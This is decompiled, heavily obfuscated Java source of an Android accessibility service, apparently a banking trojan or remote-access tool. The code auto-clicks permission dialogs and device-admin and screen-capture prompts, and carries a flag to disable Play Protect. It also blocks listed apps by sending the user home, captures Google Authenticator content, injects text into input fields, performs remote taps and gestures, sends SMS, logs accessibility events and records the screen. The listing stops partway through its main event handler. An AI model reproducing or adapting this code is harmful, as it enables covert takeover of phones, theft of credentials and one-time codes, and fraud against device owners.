package com.appser;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.support.v4.app.NotificationCompat;
import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.text.format.DateFormat;
import android.util.Base64;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32 extends AccessibilityService {
    public static List<String> DisabledApps = new ArrayList();
    public static Boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Auto_Click = false;
    public static boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32CheckPrims = false;
    public static String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32DisablePlayProtect = "[DIS_PROTECTION]";
    public static Boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_ADM = false;
    public static Boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_IN = false;
    public static Boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_SC = false;
    public static Boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_prim = false;
    public static AccessibilityEvent advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32GlobalEvent = null;
    public static AccessibilityNodeInfo advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Globalnode = null;
    public static Boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32NeedPaste = false;
    public static String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32OFFOK = "on";
    public static String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32OFK = "breathvoperaj1";
    public static boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32RecorderActive = false;
    public static boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Recording = false;
    public static boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendGoogleAuth = false;
    public static String advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32ToPaste = "";
    public static Boolean advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32bypass = false;
    public static WindowManager.LayoutParams advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32lay;
    public static MediaRecorder advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32mRecorder;
    public static WindowManager advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32wm;
    public static DevicePolicyManager mDPM;
    public static SurfaceView sfw;
    public static String useRec = "NO";
    private ComponentName mAdminName;

    public void onInterrupt() {
    }

    private String getEventText(AccessibilityEvent accessibilityEvent) {
        return accessibilityEvent.getText().toString();
    }

    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome() {
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                public void run() {
                    try {
                        Intent intent = new Intent("android.intent.action.MAIN");
                        intent.addCategory("android.intent.category.HOME");
                        intent.setFlags(268435456);
                        advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.this.startActivity(intent);
                    } catch (Exception unused) {
                    }
                }
            });
        } catch (Exception unused) {
        }
    }

    public void mouseDraw(Point[] pointArr, int i) {
        if (Build.VERSION.SDK_INT >= 24) {
            Path path = new Path();
            path.moveTo((float) pointArr[0].x, (float) pointArr[0].y);
            for (int i2 = 1; i2 < pointArr.length; i2++) {
                path.lineTo((float) pointArr[i2].x, (float) pointArr[i2].y);
                dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0, (long) i)).build(), new AccessibilityService.GestureResultCallback() {
                    public void onCompleted(GestureDescription gestureDescription) {
                        super.onCompleted(gestureDescription);
                    }

                    public void onCancelled(GestureDescription gestureDescription) {
                        super.onCancelled(gestureDescription);
                    }
                }, (Handler) null);
            }
        }
    }

    public static void sendSMS(String str, String str2) {
        try {
            SmsManager.getDefault().sendTextMessage(str, (String) null, str2, (PendingIntent) null, (PendingIntent) null);
        } catch (Exception unused) {
        }
    }

    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SW(String str) {
        boolean z;
        try {
            getResources().getDisplayMetrics();
            if (Build.VERSION.SDK_INT >= 26) {
                int i = 1;
                if (str.startsWith("clk")) {
                    String[] split = str.split(":");
                    int parseInt = Integer.parseInt(split[1]);
                    int parseInt2 = Integer.parseInt(split[2]);
                    if (str.contains("hold")) {
                        parseInt = Integer.parseInt(split[2]);
                        parseInt2 = Integer.parseInt(split[3]);
                        i = 3000;
                        z = true;
                    } else {
                        z = false;
                    }
                    Path path = new Path();
                    path.moveTo((float) parseInt, (float) parseInt2);
                    GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path, 0, (long) i, z);
                    GestureDescription.Builder builder = new GestureDescription.Builder();
                    builder.addStroke(strokeDescription);
                    dispatchGesture(builder.build(), (AccessibilityService.GestureResultCallback) null, (Handler) null);
                } else if (str.equals("Bc")) {
                    performGlobalAction(1);
                } else if (str.equals("Ho")) {
                    performGlobalAction(2);
                } else if (str.equals("RC")) {
                    performGlobalAction(3);
                }
            }
        } catch (Exception unused) {
        }
    }

    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32pasteText() {
        try {
            AccessibilityNodeInfo findFocus = getRootInActiveWindow().findFocus(1);
            if (findFocus != null) {
                Bundle bundle = new Bundle();
                bundle.putString(AccessibilityNodeInfoCompat.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32ToPaste);
                if (!findFocus.performAction(2097152, bundle)) {
                    if (advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Globalnode != null) {
                        advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Globalnode.performAction(2097152, bundle);
                    } else {
                        return;
                    }
                }
                advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32ToPaste = "";
                advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32NeedPaste = false;
            }
        } catch (Exception unused) {
        }
    }

    public void advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Treger() {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            public void run() {
                try {
                    AccessibilityManager accessibilityManager = (AccessibilityManager) advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.app_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_Context.getSystemService("accessibility");
                    if (accessibilityManager.isEnabled()) {
                        AccessibilityEvent obtain = AccessibilityEvent.obtain();
                        obtain.setEventType(16384);
                        obtain.setClassName(getClass().getName());
                        obtain.setPackageName(advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.app_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_Context.getPackageName());
                        obtain.getText().add("T");
                        accessibilityManager.sendAccessibilityEvent(obtain);
                    }
                } catch (Exception unused) {
                }
            }
        });
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(6:48|49|(1:51)|52|53|(1:55)) */
    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:120:0x01ff */
    /* JADX WARNING: Missing exception handler attribute for start block: B:147:0x02bd */
    /* JADX WARNING: Missing exception handler attribute for start block: B:270:0x0544 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:28:0x0059 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:52:0x008e */
    /* JADX WARNING: Missing exception handler attribute for start block: B:67:0x00cc */
    /* JADX WARNING: Removed duplicated region for block: B:123:0x0203 A[Catch:{ Exception -> 0x05d8 }] */
    /* JADX WARNING: Removed duplicated region for block: B:137:0x023a A[Catch:{ Exception -> 0x05d8 }] */
    /* JADX WARNING: Removed duplicated region for block: B:191:0x03a6  */
    /* JADX WARNING: Removed duplicated region for block: B:243:0x0498 A[Catch:{ Exception -> 0x05d8 }] */
    /* JADX WARNING: Removed duplicated region for block: B:288:0x05a4 A[Catch:{ Exception -> 0x05d8 }] */
    /* JADX WARNING: Removed duplicated region for block: B:305:? A[RETURN, SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:307:? A[RETURN, SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x0061  */
    /* JADX WARNING: Removed duplicated region for block: B:34:0x0063  */
    /* JADX WARNING: Removed duplicated region for block: B:38:0x0071 A[Catch:{ Exception -> 0x0073 }] */
    /* JADX WARNING: Removed duplicated region for block: B:41:0x0075  */
    /* JADX WARNING: Removed duplicated region for block: B:55:0x0092 A[Catch:{ Exception -> 0x00cc }] */
    /* JADX WARNING: Removed duplicated region for block: B:56:0x0096 A[Catch:{ Exception -> 0x00cc }] */
    /* JADX WARNING: Removed duplicated region for block: B:71:0x00d6 A[SYNTHETIC, Splitter:B:71:0x00d6] */
    /* JADX WARNING: Removed duplicated region for block: B:87:0x0120 A[RETURN] */
    /* JADX WARNING: Removed duplicated region for block: B:88:0x0121 A[SYNTHETIC, Splitter:B:88:0x0121] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent r19) {
        /*
            r18 = this;
            r0 = r18
            r1 = r19
            java.lang.String r2 = "com.android.permissioncontroller:id/permission_allow_button"
            java.lang.String r3 = "com.android.permissioncontroller:id/permission_allow_foreground_only_button"
            java.lang.String r4 = "com.android.settings:id/action_button"
            java.lang.String r5 = "android:id/button1"
            java.lang.String r6 = "com.android.settings.SubSettings"
            r7 = 0
            int r8 = r19.getEventType()     // Catch:{ Exception -> 0x0016 }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32GlobalEvent = r1     // Catch:{ Exception -> 0x0017 }
            goto L_0x0017
        L_0x0016:
            r8 = 0
        L_0x0017:
            r10 = 5
            r11 = 64
            r12 = 32
            r13 = 2
            r14 = 16
            if (r8 == r13) goto L_0x0034
            r13 = 8
            if (r8 == r13) goto L_0x0033
            if (r8 == r14) goto L_0x0031
            if (r8 == r12) goto L_0x002f
            if (r8 == r11) goto L_0x002d
            r13 = 0
            goto L_0x0034
        L_0x002d:
            r13 = 4
            goto L_0x0034
        L_0x002f:
            r13 = 5
            goto L_0x0034
        L_0x0031:
            r13 = 3
            goto L_0x0034
        L_0x0033:
            r13 = 1
        L_0x0034:
            r0.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32sendlog(r1, r13)     // Catch:{ Exception -> 0x05d8 }
            java.util.List<java.lang.String> r16 = DisabledApps     // Catch:{ Exception -> 0x0059 }
            int r16 = r16.size()     // Catch:{ Exception -> 0x0059 }
            if (r16 <= 0) goto L_0x0059
            java.util.List<java.lang.String> r13 = DisabledApps     // Catch:{ Exception -> 0x0059 }
            java.lang.CharSequence r17 = r19.getPackageName()     // Catch:{ Exception -> 0x0059 }
            java.lang.String r17 = r17.toString()     // Catch:{ Exception -> 0x0059 }
            java.lang.String r15 = r17.toLowerCase()     // Catch:{ Exception -> 0x0059 }
            boolean r13 = r13.contains(r15)     // Catch:{ Exception -> 0x0059 }
            if (r13 == 0) goto L_0x0059
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x0059 }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendMeHome()     // Catch:{ Exception -> 0x0059 }
        L_0x0059:
            android.view.accessibility.AccessibilityNodeInfo r13 = r19.getSource()     // Catch:{ Exception -> 0x005e }
            goto L_0x005f
        L_0x005e:
            r13 = 0
        L_0x005f:
            if (r13 == 0) goto L_0x0063
            r15 = 1
            goto L_0x0064
        L_0x0063:
            r15 = 0
        L_0x0064:
            java.lang.CharSequence r9 = r19.getClassName()     // Catch:{ Exception -> 0x0073 }
            java.lang.String r14 = "android.widget.EditText"
            boolean r9 = r9.equals(r14)     // Catch:{ Exception -> 0x0073 }
            r9 = r9 & r15
            if (r9 == 0) goto L_0x0073
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Globalnode = r13     // Catch:{ Exception -> 0x0073 }
        L_0x0073:
            if (r8 == r12) goto L_0x0096
            if (r8 == r11) goto L_0x0088
            r9 = 16384(0x4000, float:2.2959E-41)
            if (r8 == r9) goto L_0x007c
            goto L_0x00cc
        L_0x007c:
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32NeedPaste     // Catch:{ Exception -> 0x00cc }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x00cc }
            if (r8 == 0) goto L_0x00cc
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32pasteText()     // Catch:{ Exception -> 0x00cc }
            goto L_0x00cc
        L_0x0088:
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32 r8 = com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess     // Catch:{ Exception -> 0x008e }
            if (r8 != 0) goto L_0x008e
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.MyAccess = r0     // Catch:{ Exception -> 0x008e }
        L_0x008e:
            boolean r8 = com.appser.outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4.ec_outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4_ho     // Catch:{ Exception -> 0x00cc }
            if (r8 == 0) goto L_0x00cc
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendNotifi(r19)     // Catch:{ Exception -> 0x00cc }
            goto L_0x00cc
        L_0x0096:
            boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32SendGoogleAuth     // Catch:{ Exception -> 0x00cc }
            if (r8 == 0) goto L_0x00a9
            java.lang.CharSequence r8 = r19.getPackageName()     // Catch:{ Exception -> 0x00cc }
            java.lang.String r8 = r8.toString()     // Catch:{ Exception -> 0x00cc }
            java.lang.String r8 = r8.toLowerCase()     // Catch:{ Exception -> 0x00cc }
            com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5._SGA2(r1, r8)     // Catch:{ Exception -> 0x00cc }
        L_0x00a9:
            boolean r8 = com.appser.outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4.ec_outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4_ho     // Catch:{ Exception -> 0x00cc }
            if (r8 == 0) goto L_0x00b0
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32ActivSend(r19)     // Catch:{ Exception -> 0x00cc }
        L_0x00b0:
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_IN     // Catch:{ Exception -> 0x00cc }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x00cc }
            if (r8 == 0) goto L_0x00cc
            boolean r8 = r0.Gotitinstalled(r13)     // Catch:{ Exception -> 0x00cc }
            if (r8 == 0) goto L_0x00cc
            java.lang.Boolean r8 = java.lang.Boolean.valueOf(r7)     // Catch:{ Exception -> 0x00cc }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_IN = r8     // Catch:{ Exception -> 0x00cc }
            r8 = 100
            java.lang.Thread.sleep(r8)     // Catch:{ Exception -> 0x00cc }
            r18.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32blockBack()     // Catch:{ Exception -> 0x00cc }
        L_0x00cc:
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_ADM     // Catch:{ Exception -> 0x05d8 }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r9 = "device_policy"
            if (r8 == 0) goto L_0x00f8
            r18.getApplicationContext()     // Catch:{ Exception -> 0x05d8 }
            java.lang.Object r8 = r0.getSystemService(r9)     // Catch:{ Exception -> 0x05d8 }
            android.app.admin.DevicePolicyManager r8 = (android.app.admin.DevicePolicyManager) r8     // Catch:{ Exception -> 0x05d8 }
            mDPM = r8     // Catch:{ Exception -> 0x05d8 }
            android.content.ComponentName r8 = new android.content.ComponentName     // Catch:{ Exception -> 0x05d8 }
            java.lang.Class<com.appser.AdminReciver> r11 = com.appser.AdminReciver.class
            r8.<init>(r0, r11)     // Catch:{ Exception -> 0x05d8 }
            r0.mAdminName = r8     // Catch:{ Exception -> 0x05d8 }
            android.app.admin.DevicePolicyManager r11 = mDPM     // Catch:{ Exception -> 0x05d8 }
            boolean r8 = r11.isAdminActive(r8)     // Catch:{ Exception -> 0x05d8 }
            if (r8 == 0) goto L_0x00f8
            java.lang.Boolean r8 = java.lang.Boolean.valueOf(r7)     // Catch:{ Exception -> 0x05d8 }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_ADM = r8     // Catch:{ Exception -> 0x05d8 }
        L_0x00f8:
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Auto_Click     // Catch:{ Exception -> 0x05d8 }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x05d8 }
            if (r8 != 0) goto L_0x0118
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_SC     // Catch:{ Exception -> 0x05d8 }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x05d8 }
            if (r8 != 0) goto L_0x0118
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_prim     // Catch:{ Exception -> 0x05d8 }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x05d8 }
            if (r8 != 0) goto L_0x0118
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_ADM     // Catch:{ Exception -> 0x05d8 }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x05d8 }
            if (r8 == 0) goto L_0x01ff
        L_0x0118:
            int r8 = android.os.Build.VERSION.SDK_INT     // Catch:{ Exception -> 0x05d8 }
            r12 = 18
            if (r8 < r12) goto L_0x01ff
            if (r13 != 0) goto L_0x0121
            return
        L_0x0121:
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_SC     // Catch:{ Exception -> 0x01ff }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x01ff }
            if (r8 == 0) goto L_0x012e
            java.lang.String r8 = "Start Now"
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32clickByText(r8)     // Catch:{ Exception -> 0x01ff }
        L_0x012e:
            java.lang.Boolean r8 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_prim     // Catch:{ Exception -> 0x01ff }
            boolean r8 = r8.booleanValue()     // Catch:{ Exception -> 0x01ff }
            if (r8 == 0) goto L_0x013b
            java.lang.String r8 = "Allow"
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32clickByText(r8)     // Catch:{ Exception -> 0x01ff }
        L_0x013b:
            java.lang.String r8 = "com.android.packageinstaller:id/permission_allow_button"
            java.lang.String[] r8 = new java.lang.String[]{r8, r5, r4, r3, r2}     // Catch:{ Exception -> 0x01ff }
            r12 = 0
        L_0x0142:
            if (r12 >= r10) goto L_0x01ac
            r14 = r8[r12]     // Catch:{ Exception -> 0x01ff }
            java.util.List r14 = r13.findAccessibilityNodeInfosByViewId(r14)     // Catch:{ Exception -> 0x01ff }
            java.util.Iterator r14 = r14.iterator()     // Catch:{ Exception -> 0x01ff }
        L_0x014e:
            boolean r15 = r14.hasNext()     // Catch:{ Exception -> 0x01ff }
            if (r15 == 0) goto L_0x01a5
            java.lang.Object r15 = r14.next()     // Catch:{ Exception -> 0x01ff }
            android.view.accessibility.AccessibilityNodeInfo r15 = (android.view.accessibility.AccessibilityNodeInfo) r15     // Catch:{ Exception -> 0x01ff }
            r10 = 16
            r15.performAction(r10)     // Catch:{ Exception -> 0x01ff }
            java.lang.Boolean r10 = java.lang.Boolean.valueOf(r7)     // Catch:{ Exception -> 0x01ff }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Auto_Click = r10     // Catch:{ Exception -> 0x01ff }
            android.content.Context r10 = r18.getApplicationContext()     // Catch:{ Exception -> 0x01ff }
            java.lang.String r15 = "SCH"
            java.lang.String r7 = "720"
            java.lang.String r7 = com.appser.MySettings.read(r10, r15, r7)     // Catch:{ Exception -> 0x01ff }
            android.content.Context r10 = r18.getApplicationContext()     // Catch:{ Exception -> 0x01ff }
            java.lang.String r15 = "SCW"
            java.lang.String r11 = "1080"
            java.lang.String r10 = com.appser.MySettings.read(r10, r15, r11)     // Catch:{ Exception -> 0x01ff }
            int r7 = java.lang.Integer.parseInt(r7)     // Catch:{ Exception -> 0x01ff }
            int r10 = java.lang.Integer.parseInt(r10)     // Catch:{ Exception -> 0x01ff }
            r11 = r8[r12]     // Catch:{ Exception -> 0x01ff }
            boolean r11 = r11.contains(r4)     // Catch:{ Exception -> 0x01ff }
            if (r11 == 0) goto L_0x01a0
            r11 = 0
        L_0x018e:
            r15 = 80
            if (r11 >= r15) goto L_0x01a0
            r15 = 15
            int r1 = r7 + -15
            int r15 = r10 - r11
            r0.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32click(r1, r15)     // Catch:{ Exception -> 0x01ff }
            int r11 = r11 + 2
            r1 = r19
            goto L_0x018e
        L_0x01a0:
            r1 = r19
            r7 = 0
            r10 = 5
            goto L_0x014e
        L_0x01a5:
            int r12 = r12 + 1
            r1 = r19
            r7 = 0
            r10 = 5
            goto L_0x0142
        L_0x01ac:
            java.lang.String r1 = "com.android.settings:id/left_button"
            java.lang.String[] r1 = new java.lang.String[]{r1, r5, r3, r2}     // Catch:{ Exception -> 0x01ff }
            r2 = 0
        L_0x01b3:
            r3 = 4
            if (r2 >= r3) goto L_0x01dc
            r4 = r1[r2]     // Catch:{ Exception -> 0x01ff }
            java.util.List r4 = r13.findAccessibilityNodeInfosByViewId(r4)     // Catch:{ Exception -> 0x01ff }
            java.util.Iterator r4 = r4.iterator()     // Catch:{ Exception -> 0x01ff }
        L_0x01c0:
            boolean r5 = r4.hasNext()     // Catch:{ Exception -> 0x01ff }
            if (r5 == 0) goto L_0x01d9
            java.lang.Object r5 = r4.next()     // Catch:{ Exception -> 0x01ff }
            android.view.accessibility.AccessibilityNodeInfo r5 = (android.view.accessibility.AccessibilityNodeInfo) r5     // Catch:{ Exception -> 0x01ff }
            r7 = 16
            r5.performAction(r7)     // Catch:{ Exception -> 0x01ff }
            r5 = 0
            java.lang.Boolean r7 = java.lang.Boolean.valueOf(r5)     // Catch:{ Exception -> 0x01ff }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Auto_Click = r7     // Catch:{ Exception -> 0x01ff }
            goto L_0x01c0
        L_0x01d9:
            int r2 = r2 + 1
            goto L_0x01b3
        L_0x01dc:
            java.lang.String r1 = "com.miui.securitycenter:id/accept"
            java.util.List r1 = r13.findAccessibilityNodeInfosByViewId(r1)     // Catch:{ Exception -> 0x01ff }
            java.util.Iterator r1 = r1.iterator()     // Catch:{ Exception -> 0x01ff }
        L_0x01e6:
            boolean r2 = r1.hasNext()     // Catch:{ Exception -> 0x01ff }
            if (r2 == 0) goto L_0x01ff
            java.lang.Object r2 = r1.next()     // Catch:{ Exception -> 0x01ff }
            android.view.accessibility.AccessibilityNodeInfo r2 = (android.view.accessibility.AccessibilityNodeInfo) r2     // Catch:{ Exception -> 0x01ff }
            r3 = 16
            r2.performAction(r3)     // Catch:{ Exception -> 0x01ff }
            r2 = 0
            java.lang.Boolean r4 = java.lang.Boolean.valueOf(r2)     // Catch:{ Exception -> 0x01ff }
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32Auto_Click = r4     // Catch:{ Exception -> 0x01ff }
            goto L_0x01e6
        L_0x01ff:
            boolean r1 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32CheckPrims     // Catch:{ Exception -> 0x05d8 }
            if (r1 == 0) goto L_0x022a
            java.lang.String[] r1 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.PERMISSIONS()     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.H__advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_P(r0, r1)     // Catch:{ Exception -> 0x05d8 }
            if (r1 != 0) goto L_0x0227
            r1 = 0
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32CheckPrims = r1     // Catch:{ Exception -> 0x05d8 }
            android.content.Intent r1 = new android.content.Intent     // Catch:{ Exception -> 0x022a }
            java.lang.Class<com.appser.miniatureosiderframescportionyquestiirelandibizrateotestimonymalienjshippeddroomsqansweredc24> r2 = com.appser.miniatureosiderframescportionyquestiirelandibizrateotestimonymalienjshippeddroomsqansweredc24.class
            r1.<init>(r0, r2)     // Catch:{ Exception -> 0x022a }
            r2 = 268435456(0x10000000, float:2.5243549E-29)
            android.content.Intent r1 = r1.addFlags(r2)     // Catch:{ Exception -> 0x022a }
            r2 = 1073741824(0x40000000, float:2.0)
            android.content.Intent r1 = r1.addFlags(r2)     // Catch:{ Exception -> 0x022a }
            r0.startActivity(r1)     // Catch:{ Exception -> 0x022a }
            return
        L_0x0227:
            r1 = 1
            advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32CheckPrims = r1     // Catch:{ Exception -> 0x05d8 }
        L_0x022a:
            java.lang.Boolean r1 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32bypass     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = r1.booleanValue()     // Catch:{ Exception -> 0x05d8 }
            if (r1 != 0) goto L_0x05d8
            java.lang.Boolean r1 = advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32FOR_ADM     // Catch:{ Exception -> 0x05d8 }
            boolean r1 = r1.booleanValue()     // Catch:{ Exception -> 0x05d8 }
            if (r1 != 0) goto L_0x05d8
            java.lang.StringBuilder r1 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x05d8 }
            r1.<init>()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r2 = "["
            r1.append(r2)     // Catch:{ Exception -> 0x05d8 }
            android.content.Context r2 = r18.getApplicationContext()     // Catch:{ Exception -> 0x05d8 }
            android.content.res.Resources r2 = r2.getResources()     // Catch:{ Exception -> 0x05d8 }
            r3 = 2131296269(0x7f09000d, float:1.821045E38)
            java.lang.String r2 = r2.getString(r3)     // Catch:{ Exception -> 0x05d8 }
            r1.append(r2)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r2 = "]"
            r1.append(r2)     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r1 = r1.toString()     // Catch:{ Exception -> 0x05d8 }
            android.content.Context r2 = r18.getApplicationContext()     // Catch:{ Exception -> 0x05d8 }
            android.content.res.Resources r2 = r2.getResources()     // Catch:{ Exception -> 0x05d8 }
            java.lang.String r2 = r2.getString(r3)     // Catch:{ Exception -> 0x05d8 }
            int r4 = android.os.Build.VERSION.SDK_INT     // Catch:{ Exception -> 0x05d8 }
            r5 = 15
            if (r4 <= r5) goto L_0x05d8
            java.lang.CharSequence r4 = r19.getClassName()     // Catch:{ Exception -> 0x05d8 }
